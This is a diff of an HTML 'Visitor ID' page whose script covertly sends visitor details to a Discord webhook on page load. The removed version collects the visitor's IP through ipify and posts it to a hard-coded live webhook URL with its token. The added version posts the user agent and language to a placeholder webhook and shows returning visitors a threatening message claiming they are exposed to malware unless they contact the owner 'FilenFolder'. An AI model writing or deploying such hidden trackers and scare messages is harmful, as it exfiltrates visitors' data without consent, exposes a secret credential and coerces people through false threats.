@@ -5,63 +5,53 @@
   <title>Visitor ID</title>
   <style>
     body { font-family: Arial, sans-serif; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    .box { background: #f0f0f0; padding: 15px; border-radius: 8px; text-align: center; }
+    .box { background: #f0f0f0; padding: 15px; border-radius: 8px; text-align: center; max-width: 500px; }
+    .warning { color: red; font-weight: bold; margin-top: 15px; }
   </style>
 </head>
 <body>
   <div class="box">
-    <h2>Visitor ID (Send it to the owner)</h2>
+    <h2>Visitor ID</h2>
     <p id="visitor"></p>
+    <p id="warning" class="warning"></p>
   </div>
 
   <script>
-    // VARIABLES
-    let visitorID = localStorage.getItem("visitorID");
-    let deviceName = "Not available";
-    let osName = "Unknown";
-    let ipAddress = "Fetching...";
+    const webhookURL = "YOUR_WEBHOOK_URL_HERE"; // replace with your Discord webhook
 
-    // Create visitorID if missing
+    // Check if a visitor ID already exists
+    let visitorID = localStorage.getItem("visitorID");
+    let sent = localStorage.getItem("visitorSent");
+
+    // If no ID, create a new one
     if (!visitorID) {
       visitorID = crypto.randomUUID();
       localStorage.setItem("visitorID", visitorID);
     }
 
-    // Detect OS
-    const ua = navigator.userAgent;
-    if (ua.includes("Windows")) osName = "Windows";
-    else if (ua.includes("Mac")) osName = "macOS";
-    else if (ua.includes("Linux")) osName = "Linux";
-    else if (ua.includes("Android")) osName = "Android";
-    else if (ua.includes("iPhone") || ua.includes("iPad")) osName = "iOS";
-
-    // Show Visitor ID
+    // Display the visitor ID
     document.getElementById("visitor").textContent = visitorID;
 
-    // Fetch IP
-    fetch("https://api.ipify.org?format=json")
-      .then(r => r.json())
-      .then(data => {
-        ipAddress = data.ip;
+    // If not sent before, send to webhook
+    if (!sent) {
+      const payload = {
+        content: `Visitor ID: ${visitorID}\nOS: ${navigator.userAgent}\nLanguage: ${navigator.language}`
+      };
 
-        // SEND TO WEBHOOK
-        const webhookURL = "https://discord.com/api/webhooks/1442178514911625358/7XnMXNkc-Sxjv-xTFgp89ARbLkGMdTefufyFZnjBV3CJU0sBwPax6VMCPfuzjNjfIKhe";
-        const payload = {
-          content: 
-            "**New Visitor**\n" +
-            `ID: ${visitorID}\n` +
-            `OS: ${osName}\n` +
-            `Device: ${deviceName}\n` +
-            `IP: ${ipAddress}`
-        };
-
-        fetch(webhookURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      });
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      })
+      .then(() => {
+        console.log("Visitor ID sent!");
+        localStorage.setItem("visitorSent", "true");
+      })
+      .catch(err => console.error("Failed to send webhook:", err));
+    } else {
+      document.getElementById("warning").textContent =
+        "WARNING: THE VISITOR ID IS EXPIRED, SEND THE OWNER 'FilenFolder' THE VISITOR ID, IF YOU DON'T -- YOUR EXPOSED TO MALWARE";
+    }
   </script>
 </body>
 </html>
-
